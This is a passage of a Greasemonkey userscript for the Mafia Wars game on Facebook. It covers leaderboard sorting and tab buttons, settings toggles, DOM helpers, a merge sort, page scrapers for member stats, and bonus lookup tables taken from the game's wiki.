            iButtons = oButtons.length

            for (i = 0; i < iButtons; i = i + 1) {
                oButton = oButtons[i];

                test = oButton.firstChild.getAttribute('src');

                if (i == iButton) {
                    if (test!='') {
                        // if this button is the active one.  Flip the direction
                        if (aTopMafiaSortDirection[i]==0)
                            aTopMafiaSortDirection[i]=1
                        else
                            aTopMafiaSortDirection[i]=0;

                        // Save the sort direction
                        GM_setValue(FB_user_id+'-aTopMafiaSortDirection['+i+']',aTopMafiaSortDirection[i]);
                    }
                    oButton.firstChild.setAttribute('src',imgArrow[aTopMafiaSortDirection[i]]); 
                } else {
                    oButton.firstChild.setAttribute('src','');
                }

            }

            //Activate the appropriate body
            oDOM = document.getElementById(strLeaderBoardTables);

            oDOM.replaceChild(aTopMafiaDisplayTable[iButton][aTopMafiaSortDirection[iButton]],oDOM.firstChild);

        }
    }

    function click_TopMafiaDisplay() {
        CreateTopMafiaDisplay();
        DisplaySettings();

    }

    function click_TopMafiaButtons(iButton) {
        return function () {
            var iBC, oButtons, oButton, iButtons, ODOM;

            // Change the Toolbar
            oDOM = document.getElementById(strLeaderBoardToolbar);
            oButtons = oDOM.childNodes;
            iButtons = oButtons.length

            for (i = 0; i < iButtons; i++) {
                oButton = oButtons[i];
                if (i == iButton) {
                    oButton.setAttribute('class','tab_on tab_middle');
                } else {
                    oButton.setAttribute('class','tab_off tab_middle');
                }

            }

            //Activate the appropriate body
            oDOM = document.getElementById(strTopMafiaTables);

            oDOM.replaceChild(aTopBonusDisplayTable[iButton],oDOM.firstChild);

        }

    }

    function click_Auto(_iSwitch) {

        return function () {
            if(_iSwitch == 0)
                bAutoDisable = false
            else
                bAutoDisable = true;
           GM_setValue('bAutoDisable', bAutoDisable);
           DisplaySettings();
        }
    }

    function click_Sort(_iSwitch) {

        return function () {
            if (bDataBeingUpdated) {
                alert('Cannot change sort method while data update in progress');
            } else {
                if(_iSwitch == 0)
                    iAlphaSortBy = 0
                else
                    iAlphaSortBy = 1;
                GM_setValue('iAlphaSortBy', iAlphaSortBy);
                DisplaySettings();

                //cancel any existing processing event
                clearTimeout(iProcessEvent)

                //start a new event
                bSaveData= false;
                iProcessEvent = setTimeout(function (e) {
                    ProcessData(4);
                },
                750)
            }
        }
    }
    
    function click_ReLoad() {
        if (bDataBeingUpdated) {
            alert('Cannot force a manual reload.  Data update is already in progress');
        } else {
            GM_setValue('ForceReload', true);
        }
    }

    // handles the menu command...
    // Force a manula reload of the data
    function menu_Debug() {
        
         var bDebugOn, strTemp;

         bDebugOn = GM_getValue('bDebugOn');

         if (!bDebugOn) {
             strTemp = 'Debug Mode mode currently ON.  Do you want to disable it?';
         } else {
             strTemp = 'Debug Mode mode currently OFF.  Do you want to enable it?';
         }

        if (window.confirm(strTemp)) {
            bDebugOn = !bDebugOn;
            GM_setValue('bDebugOn', bDebugOn);
        }
    }

    // Disable the automatic loading of data
    function menu_AutoLoad() {

         var bAutoDisable, strTemp;

         bAutoDisable = GM_getValue('bAutoDisable');

         if (!bAutoDisable) {
             strTemp = 'Automatic loading of data is currently ON.  Do you want to disable it?';
         } else {
             strTemp = 'Automatic loading of data is currently OFF.  Do you want to enable it?';
         }

        if (window.confirm(strTemp)) {
            bAutoDisable = !bAutoDisable;
            GM_setValue('bAutoDisable', bAutoDisable);
        }
    }

}


/*****  DOM Utilies *****/

function DOMUtils() {
    this.newElem = newElem;
    this.newText = newText;
    this.getElem = getElem;
    this.doAppend = doAppend;
    this.doPrepend = doPrepend;

    // creates a DOM element
    function newElem(_strType, _strId, _strClass, _strStyle) {
        var eElem = document.createElement(_strType);
        if (_strId) eElem.id = _strId;
        if (_strClass) eElem.setAttribute('class', _strClass);
        if (_strStyle) eElem.setAttribute('style', _strStyle);
        return eElem;
    }

    // creates a DOM element
    function newText(_strText) {
        return document.createTextNode(_strText);
    }

    //gets a DOM element
    function getElem(_strName, _bByTag) {
        eElem = null;

        if (!_bByTag) eElem = document.getElementById(_strName);
        else eElem = document.getElementsByTagName(_strName);

        return eElem;
    }

    // appends an object to a DOM element
    function doAppend(_ostrParentElem, _oChildElem) {
        if (typeof _ostrParentElem == 'string') getElem(_ostrParentElem).appendChild(_oChildElem);

        if (typeof _ostrParentElem == 'object') _ostrParentElem.appendChild(_oChildElem);

        return _oChildElem;
    }

    // prepends an object to a DOM element
    function doPrepend(_ostrParentElem, _oChildElem) {
        if (typeof _ostrParentElem == 'string') getElem(_ostrParentElem).insertBefore(_oChildElem, getElem(_ostrParentElem).firstChild);

        if (typeof _ostrParentElem == 'object') _ostrParentElem.insertBefore(_oChildElem, _ostrParentElem.firstChild);

        return _oChildElem;
    }

}

/*****  General Functions   *****/

function Utilities() {
    // making them public
    this.getSnapshot = getSnapshot;
    this.getCurrentTime = getCurrentTime;
    this.addDelay = addDelay;
    this.getRandRange = getRandRange;
    this.MergeSort = MergeSort;
    this.getMafiaMemberFBName = getMafiaMemberFBName;
    this.getMafiaMemberMWName = getMafiaMemberMWName;
    this.getMafiaMemberLevel = getMafiaMemberLevel;
    this.getMafiaMemberType = getMafiaMemberType;
    this.getMafiaMemberFightswon = getMafiaMemberFightswon;
    this.getMafiaMemberSussfulheists = getMafiaMemberSussfulheists;
    this.getMafiaMemberjobscompleted = getMafiaMemberjobscompleted;
    this.getMastermindBonus = getMastermindBonus;
    this.getWheelmanBonus = getWheelmanBonus;
    this.getButtonmanBonus = getButtonmanBonus;
    this.getBagmanBonus = getBagmanBonus;
    this.getBodyguardBonus = getBodyguardBonus;
    this.getSafecrackerBonus = getSafecrackerBonus;
    this.isOdd = isOdd;
    this.isEven = isEven;

    // logging (internal)
    this.doLog = doLog;
    this.doLogError = doLogError;

    // xpath results
    function getSnapshot(_strPattern) {
        return document.evaluate(_strPattern, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    }

    // gets the current timestamp in minutes
    function getCurrentTime() {
        return Math.round(new Date().getTime() / 1000 / 60);
    }

    // adds time to the global delay cue
    function addDelay(_iNewDelay) {
        g_iCurDelay += parseInt(_iNewDelay);
        return g_iCurDelay;
    }

    // gets a random num within a range
    function getRandRange(_iLow, _iHigh) {
        return Math.floor((_iHigh - _iLow) * Math.random()) + _iLow;
    }

    // logging
    function doLog(_strSource, _bDebugOn, _strMessage) {
        if (_bDebugOn)
            GM_log('Source: ' + _strSource + '\r\nMessage: ' + _strMessage);

    }

    function doLogError(_strSource, _strMessage, _errObj) {
        doLog(_strSource, true, 'ERROR: ' + _strMessage.concat('\r\nDetails:\r\n', _errObj.message));

    }
 

    // This is a non recursive merge sort
    function MergeSort(_searchtype, _searchdirection) {
        //
        // Seach TYpe
        // 1    - by FBName
        // 2    - by MWName
        // 3    - by Level
        // 4    - by ??
        //
        // Search Direction
        // 0    - Asending
        // 1    - Desending
        var iarraysize, aTempMember = new Array(),

        // get the array size
        iarraysize = aMafiaMembers.length;

        // sort the mafia members
        g_Utils.doLog('Bubble Sort', bDebugOn, 'Performing the Meger Sort');

        var m = 1;

        while (m <= iarraysize) {
            i = 0;
            while (i < (iarraysize - m)) {
                left = i;
                mid = i + m;
                right = Math.min(i + 2 * m - 1, iarraysize - 1)

                left_end = mid - 1;
                tmp_pos = left;
                num_elements = right - left + 1;

                // merger the list while the both still have information
                // stop when one is empty
                while ((left <= left_end) && (mid <= right)) {
                    if (_searchdirection == 0) {
                        if (aMafiaMembers[left][_searchtype] <= aMafiaMembers[mid][_searchtype]) {
                            aTempMember[tmp_pos] = aMafiaMembers[left];
                            tmp_pos = tmp_pos + 1;
                            left = left + 1;
                        } else {
                            aTempMember[tmp_pos] = aMafiaMembers[mid];
                            tmp_pos = tmp_pos + 1;
                            mid = mid + 1;
                        }
                    } else {
                        if (aMafiaMembers[left][_searchtype] >= aMafiaMembers[mid][_searchtype]) {
                            aTempMember[tmp_pos] = aMafiaMembers[left];
                            tmp_pos = tmp_pos + 1;
                            left = left + 1;
                        } else {
                            aTempMember[tmp_pos] = aMafiaMembers[mid];
                            tmp_pos = tmp_pos + 1;
                            mid = mid + 1;
                        }
                    }
                }

                // meger the rest of the lists to the end
                while (left <= left_end) {
                    aTempMember[tmp_pos] = aMafiaMembers[left];
                    left = left + 1;
                    tmp_pos = tmp_pos + 1;
                }
                while (mid <= right) {
                    aTempMember[tmp_pos] = aMafiaMembers[mid];
                    mid = mid + 1;
                    tmp_pos = tmp_pos + 1;
                }

                // Overwrite the data in the Member list with the sorted data in the temp list
                for (iCount = 0; iCount <= num_elements; iCount++) {
                    aMafiaMembers[right] = aTempMember[right];
                    right = right - 1;
                }
                i = i + 2 * m;
            }
            m = m * 2;
        }
        g_Utils.doLog('Bubble Sort', bDebugOn, 'Done Sort');
    }

    function getMafiaMemberFBName(_oDiv) {
        var oTemp, oChild, oDom, strName;

        // get name and level
        try {
            oTemp = document.evaluate(strMyMafiaNameLevel, _oDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
            oChild = oTemp.snapshotItem(0).childNodes;
            strName = oChild[1].textContent;

            return strName;
        } catch(_errObj) {
            g_Utils.doLogError('Top level functions getMafiaMemberFBName()', 'An error ocured while trying to retreive the mafia FB name.', _errObj);
            return '';
        }
    }

    function getMafiaMemberMWName(_oDiv) {
        var oTemp, oChild, oDom, strName;

        // get name and level
        try {
            oTemp = document.evaluate(strMyMafiaNameLevel, _oDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
            oChild = oTemp.snapshotItem(0).childNodes;
            if (oChild.length == 6) {
                strName = oChild[3].textContent;
            } else {
                strName = '';
            }

            return strName;
        } catch(_errObj) {
            g_Utils.doLogError('Top level functions getMafiaMemberMWName()', 'An error ocured while trying to retreive the mafia MW name.', _errObj);
            return '';
        }
    }

    function getMafiaMemberLevel(_oDiv) {
        var oTemp, oChild, oDom, strTemp, iLevel;

        // get name and level
        try {
            oTemp = document.evaluate(strMyMafiaNameLevel, _oDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
            oChild = oTemp.snapshotItem(0).childNodes;
            strTemp = oChild[oChild.length-1].textContent;
            var aTemp = new Array;
            aTemp = strTemp.split(' ');
            iLevel = parseFloat(aTemp[1]);

            return iLevel;
        } catch(_errObj) {
            g_Utils.doLogError('Top level functions getMafiaMemberLevel()', 'An error ocured while trying to retreive the mafia member level.', _errObj);
            return 0;
        }
    }



    function getMafiaMemberType(_oDiv) {
        var oTemp, oChild, oDom, strtype;

        // get type
        try {
            oTemp = document.evaluate(strMyMafiaType, _oDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
            strType = oTemp.snapshotItem(0).textContent;

            return strType;
        } catch(_errObj) {
            g_Utils.doLogError('Top level functions getMafiaMemberType()', 'An error ocured while trying to retreive the mafia member type.', _errObj);
            return 0;
        }
    }



    function getMafiaMemberFightswon(_oDiv) {
        var oTemp, oChild, oDom, iStat;

        // get stats
        try {
            oTemp = document.evaluate(strMyMafiaStats, _oDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
            iStat = parseFloat(oTemp.snapshotItem(0).textContent);

            return iStat;
        } catch(_errObj) {
            g_Utils.doLogError('Top level functions getMafiaMemberFightswon()', 'An error ocured while trying to retreive the number of fights won.', _errObj);
            return 0;
        }
    }

    function getMafiaMemberSussfulheists(_oDiv) {
        var oTemp, oChild, oDom, iStat;

        // get stats
        try {
            oTemp = document.evaluate(strMyMafiaStats, _oDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
            iStat = parseFloat(oTemp.snapshotItem(1).textContent);

            return iStat;
        } catch(_errObj) {
            g_Utils.doLogError('Top level functions getMafiaMemberSussfulheists()', 'An error ocured while trying to retreive the number of successful heists.', _errObj);
            return 0;
        }
    }

    function getMafiaMemberjobscompleted(_oDiv) {
        var otemp, oChild, oDom, iStat;

        // get stats
        try {
            oTemp = document.evaluate(strMyMafiaStats, _oDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
            iStat = parseFloat(oTemp.snapshotItem(2).textContent);

            return iStat;
        } catch(_errObj) {
            g_Utils.doLogError('Top level functions getMafiaMemberjobscompleted()', 'An error ocured while trying to retreive the number of jobs completed.', _errObj);
            return 0;
        }
    }


    function isEven(_iNumber) {

        var iTest;

        iTest = Math.round(_iNumber/2)*2

        if (iTest == _iNumber)
           return true
        else
           return false;

    }

    function isOdd(_iNumber) {

        var iTest;

        iTest = Math.round(_iNumber/2)*2

        if (iTest != _iNumber)
           return true
        else
           return false;

    }

    // from Mafia Wiki
    // http://mafiawars.wikia.com/wiki/Top_Mafia

    function getMastermindBonus(_ijobscompleted) {

        var iBonus;

        if (_ijobscompleted>12988)
            iBonus = 10
        else if (_ijobscompleted>9998)
            iBonus = 9
        else if (_ijobscompleted>6998)
            iBonus = 8
        else if (_ijobscompleted>4998)
            iBonus = 7
        else if (_ijobscompleted>2998)
            iBonus = 6
        else if (_ijobscompleted>998)
            iBonus = 5
        else if (_ijobscompleted>498)
            iBonus = 4
        else if (_ijobscompleted>98)
            iBonus = 3
        else if (_ijobscompleted>18)
            iBonus = 2
        else
            iBonus = 1;

        return iBonus;

    }

    function getWheelmanBonus(_iplayerlevel) {

        var iBonus;

        if (_iplayerlevel>198)
            iBonus = 10
        else if (_iplayerlevel>148)
            iBonus = 9
        else if (_iplayerlevel>98)
            iBonus = 8
        else if (_iplayerlevel>78)
            iBonus = 7
        else if (_iplayerlevel>58)
            iBonus = 6
        else if (_iplayerlevel>48)
            iBonus = 5
        else if (_iplayerlevel>38)
            iBonus = 4
        else if (_iplayerlevel>28)
            iBonus = 3
        else if (_iplayerlevel>18)
            iBonus = 2
        else
            iBonus = 1;

        return iBonus;

    }

    function getButtonmanBonus(_iplayerlevel) {

        var iBonus;

        if (_iplayerlevel>298)
            iBonus = 11
        else if (_iplayerlevel>198)
            iBonus = 10
        else if (_iplayerlevel>148)
            iBonus = 9
        else if (_iplayerlevel>98)
            iBonus = 8
        else if (_iplayerlevel>78)
            iBonus = 7
        else if (_iplayerlevel>58)
            iBonus = 6
        else if (_iplayerlevel>48)
            iBonus = 5
        else if (_iplayerlevel>38)
            iBonus = 4
        else if (_iplayerlevel>28)
            iBonus = 3
        else if (_iplayerlevel>18)
            iBonus = 2
        else
            iBonus = 1;

        return iBonus;

    }

    function getBagmanBonus(_iplayerlevel) {

        var iBonus;

        if (_iplayerlevel>298)
            iBonus = 15
        else if (_iplayerlevel>198)
            iBonus = 14
        else if (_iplayerlevel>148)
            iBonus = 13
        else if (_iplayerlevel>98)
            iBonus = 12
        else if (_iplayerlevel>78)
            iBonus = 11
        else if (_iplayerlevel>58)
            iBonus = 10
        else if (_iplayerlevel>48)
            iBonus = 9
        else if (_iplayerlevel>38)
            iBonus = 8
        else if (_iplayerlevel>28)
            iBonus = 7
        else if (_iplayerlevel>18)
            iBonus = 6
        else
            iBonus = 5;

        return iBonus;

    }

    function getBodyguardBonus(_ifightswon) {

        var iBonus;

        if (_ifightswon>49998)
            iBonus = 11
        else if (_ifightswon>39998)
            iBonus = 10
        else if (_ifightswon>19998)
            iBonus = 9
        else if (_ifightswon>9998)
            iBonus = 8
        else if (_ifightswon>6998)
            iBonus = 7
        else if (_ifightswon>3998)
            iBonus = 6
        else if (_ifightswon>998)
            iBonus = 5
        else if (_ifightswon>498)
            iBonus = 4
        else if (_ifightswon>98)
            iBonus = 3
        else if (_ifightswon>18)
            iBonus = 2
        else
            iBonus = 1;

        return iBonus;

    }

    function getSafecrackerBonus(_successfulheists) {

        var iBonus;

        if (_successfulheists>49998)
            iBonus = 15
        else if (_successfulheists>39998)
            iBonus = 14
        else if (_successfulheists>19998)
            iBonus = 13
        else if (_successfulheists>9998)
            iBonus = 12
        else if (_successfulheists>6998)
            iBonus = 11
        else if (_successfulheists>3998)
            iBonus = 10
        else if (_successfulheists>998)
            iBonus = 9
        else if (_successfulheists>498)
            iBonus = 8
        else if (_successfulheists>98)
            iBonus = 7
        else if (_successfulheists>18)
            iBonus = 6
        else
            iBonus = 5;

        return iBonus;

    }

}
